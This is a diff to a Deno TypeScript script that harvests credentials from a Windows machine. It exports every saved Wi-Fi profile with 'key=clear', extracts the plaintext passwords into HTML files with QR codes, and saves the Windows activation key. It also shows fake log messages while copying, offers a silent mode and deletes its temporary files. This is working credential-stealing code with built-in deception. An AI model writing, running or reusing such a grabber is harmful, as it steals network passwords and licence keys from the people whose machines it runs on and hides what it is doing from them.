@@ -1,13 +1,13 @@
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { keypress } from '@cliffy/keypress';
 import { DateTime } from '@luxon';
+import { qrcode } from '@qrcode';
 import { delay } from '@std';
 import colors from '@colors';
-import qr from '@qrcode';
 import $ from '@dax';
 
 // Logs e delays ativados
-let showLogs: boolean | number = true;
+let showLogs = Deno.args.includes('-q') ? false : true;
 let winLKey: string;
 let counter = 0;
 colors;
@@ -17,18 +17,21 @@ const sleep = (timeout: number) => showLogs ? delay(timeout) : null;
 const random = (min = 500, max = 2_500) =>
 	Math.floor(Math.random() * (max - min) + min);
 
-const getTimestamp = (fmt = 'DDDD') =>
+const getTimestamp = () =>
 	DateTime.now()
-		.setLocale('pt').setZone('America/Sao_Paulo')
-		.toFormat(fmt); // Data formatada
+		.setLocale('pt')
+		.setZone('America/Sao_Paulo');
 
 //  Ativa o Listener para o teclado
 silentMode();
 
+// Se não existir, nem Title terá
+await Deno.mkdir('data').catch(() => {});
+
 // Title.txt contém uma string colorida bem cringe
-const title: string = await Deno.readTextFile('Title.txt')
+const title: string = await Deno.readTextFile('data/Title.txt')
 	.catch(() => '');
-console.log(showLogs && title || '');
+showLogs && console.log('%c' + title, 'color: red');
 
 class Spinner {
 	sector: string;
@@ -48,28 +51,28 @@ class Spinner {
 					frames: SpinnerTypes.dots.frames,
 				},
 				indent: 1,
-				color: 'cyan',
+				color: 'green',
 			}).start());
 	}
 
 	end(msg: string) {
 		this.text = msg;
-		this.spinner?.succeed(this._format());
+		this.spinner?.succeed(this._format(1));
 	}
 
 	fail(msg: string) {
 		this.text = msg;
-		this.spinner?.fail(this._format());
+		this.spinner?.fail(this._format(1));
 	}
 
-	_format() {
+	_format(status = 0) {
 		return [ // Modelo de string
 			'[',
-			this.sector.toUpperCase().cyan, // [ SECTOR
+			this.sector.toUpperCase().green, // [ SECTOR
 			'|',
-			getTimestamp('T').yellow, // [ SECTOR | 18:04
+			getTimestamp().toFormat('T').yellow, // [ SECTOR | 18:04
 			'] -',
-			this.text,
+			status ? this.text.red : this.text.cyan,
 		].join(' '); // [ SETOR | 18:04 ] - TEXT
 	}
 }
@@ -81,50 +84,71 @@ await NetSHProfileCollector();
 await copyWinKey();
 
 // Limpar registros de arquivos
-await Deno.remove('.tempdata', { recursive: true })
+await Deno.remove('temp', { recursive: true })
 	.catch(() => {});
 // 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
+
+!showLogs && Deno.exit();
 
 async function NetSHProfileCollector() {
 	createFakeLogs();
 	// sem await pra exibir os logs enquanto copia os dados
 
 	// Cria pasta de arquivos temporários (se não existir)
-	await Deno.mkdir('.tempdata').catch(() => {});
+	await Deno.mkdir('temp').catch(() => {});
 
 	// Cria pasta de senhas (se não existir)
-	await Deno.mkdir('WiFiPasswords').catch(() => {});
+	await Deno.mkdir('data/WiFiPasswords').catch(() => {});
 
 	// Chama a API do Windows
-	await $`netsh wlan export profile key=clear folder=.tempdata`.lines();
+	await $`netsh wlan export profile key=clear folder=temp`.lines();
 
-	for await (const file of Deno.readDir('.tempdata')) {
+	for await (const file of Deno.readDir('temp')) {
 		/** Por padrão, A API fornece as informações em arquivos XML bem poluídos
 		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 		 */
 		counter++;
 
 		// Lendo o conteúdo do arquivo
-		const content = await Deno.readTextFile(`.tempdata/${file.name}`);
+		const content = await Deno.readTextFile(`temp/${file.name}`);
 
 		// Filtrando as tags que são úteis
-		const [SSID, , security, password] = clearTags(content.matchAll(
+		const [SSID, , auth, pswd] = clearTags(content.matchAll(
 			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
 		));
 
 		// Gerando QR Code para conectar
-		qr.setErrorLevel('H');
-		let wifiQR: string;
-		qr.generate(
-			`WIFI:S:${SSID};T:${security};P:${password};H:false;;`,
-			{ small: true },
-			(qrCode: string) => wifiQR = qrCode,
+		const networkQR = await qrcode(
+			`WIFI:S:${SSID};T:${auth};P:${pswd};H:false;;`,
+			{ size: 256 },
 		);
 
 		// Escrevendo arquivos com as informações filtradas no diretório final
+		const networkData = `
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>${SSID[0]}</title>
+</head>
+<body>
+	<div>
+		SSID: ${SSID[1]}<br>
+		Data: ${
+			getTimestamp().toFormat('DDDD')
+		} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
+		Autenticação: ${auth[1]}<br>
+		Senha: ${pswd[1]}
+	</div><br><br>
+	<img src="${networkQR}">
+</body>
+</html>`;
+
 		await Deno.writeTextFile(
-			`WiFiPasswords/${SSID}.txt`,
-			`SSID: ${SSID}\nData: ${getTimestamp()}\nNível de segurança: ${security}\nSenha: ${password}\n\n${wifiQR!}`,
+			`data/WiFiPasswords/${SSID[0]}.html`,
+			networkData,
 		);
 	}
 }
@@ -135,11 +159,13 @@ async function copyWinKey() {
 			.lines())[1];
 
 	// Cria pasta de chaves do Windows (se não existir)
-	await Deno.mkdir('WindowsKeys').catch(() => {});
+	await Deno.mkdir('data/WindowsKeys').catch(() => {});
 
 	await Deno.writeTextFile(
-		`WindowsKeys/${Deno.hostname()}.txt`,
-		`Máquina: ${Deno.hostname()}\nData: ${getTimestamp()}\nChave de ativação do Windows: ${winLKey}`,
+		`data/WindowsKeys/${Deno.hostname()}.txt`,
+		`Máquina: ${Deno.hostname()}\nData: ${
+			getTimestamp().toFormat('DDDD')
+		}\nChave de ativação do Windows: ${winLKey}`,
 	);
 }
 
@@ -173,24 +199,26 @@ async function createFakeLogs() {
 	await sleep(random());
 	spinner.end('Registros excluídos.');
 
-	Deno.exit();
+	showLogs && Deno.exit();
 }
 
 function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 	// Regex pra filtrar as tags do XML
-	const res: string[] = [];
+	const networks: string[][] = [];
 
 	for (const match of matches) {
-		res.push(
-			String(match[0]).replace(/<.*?>/g, ''),
-		);
+		networks.push([
+			String(match[0]).replace(/<.*?>/g, ''), // nome da rede
+			match[0], // tag HTML da rede
+		]);
 	}
-	return res;
+
+	return networks;
 }
 
 async function silentMode() {
 	for await (const event of keypress()) {
-		if (event.ctrlKey && event.key === 'c') Deno.exit();
+		if (event.key === 'escape') Deno.exit();
 
 		// quando a tecla S for pressionada
 		if (event.key === 's') showLogs = false;
